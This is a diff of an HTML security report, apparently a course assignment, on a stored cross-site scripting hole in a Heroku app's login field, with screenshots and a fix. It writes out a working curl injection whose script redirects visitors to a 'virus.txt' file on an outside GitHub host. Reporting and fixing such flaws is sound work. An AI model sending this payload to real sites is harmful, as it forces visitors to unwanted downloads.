@@ -26,11 +26,19 @@
 <ol>
 <li>Issue: Cross-site scripting
 	<ul>
-	<li>Location of issue: parsing post parameters sent to server (index.js, line 90)</li>
-	<li>Severity of issue: high</li>
-	<li>Description of issue: The string login parameter stored in the database isn't parsed before being stored in the database, allowing for html script injections. For example, if </li>
-	<li>Proof of vulnerability:</li>
-	<li>Resolution:</li>
+	<li>Location of issue: Parsing post parameters sent to server (index.js, line 90)</li>
+	<li>Severity of issue: High. May lead to issues such as downloading unwanted viral content, as shown below.</li>
+	<li>Description of issue: The string login parameter stored in the database isn't parsed before being stored in the database, allowing for html script injections. For example, when I send the following to the server:
+		<p><pre>curl --data "login=&lt;script&gt; document.location.href = 'https://raw.githubusercontent.com/tuftsdev/comp20-jyang/master/security/examples/virus.txt?token=Ac8Ju3YoSwLSPnt2T127XWdADCoewghzks5aNFSdwA%3D%3D'; &lt;/script&gt;&amp;lat=0&amp;lng=0" https://stark-journey-75501.herokuapp.com/sendLocation</pre></p>
+	accessing <a href="https://stark-journey-75501.herokuapp.com/">https://stark-journey-75501.herokuapp.com/</a> will cause an automatic redirect to opening the file "virus.txt" in the browser. If the file was a .exe file instead, or any file that's automatically downloaded if it can't be opened in a browser window, serious harm could be caused.
+	</li>
+	<li>Proof of vulnerability:
+		<p><img src="examples/xss-data.png" alt="storage of untrusted data in mongodb logins database" /></p>
+		<p><img src="examples/xss-redirect.png" alt="redirected page due to cross-site script" /></p>
+	</li>
+	<li>Resolution: This issue can be alleviated by removing all special characters from the string login input by replacing index.js line 90 with:
+		<p><pre>var login = request.body.login.replace(/[^\w\s]/gi, '');</pre></p>
+	Another solution that preserves the special characters is to html encode the string login input before storing in the database, which can be done with the npm htmlencode package detailed <a href="https://www.npmjs.com/package/htmlencode">here</a>.</li>
 	</ul>
 </li>
 <br>
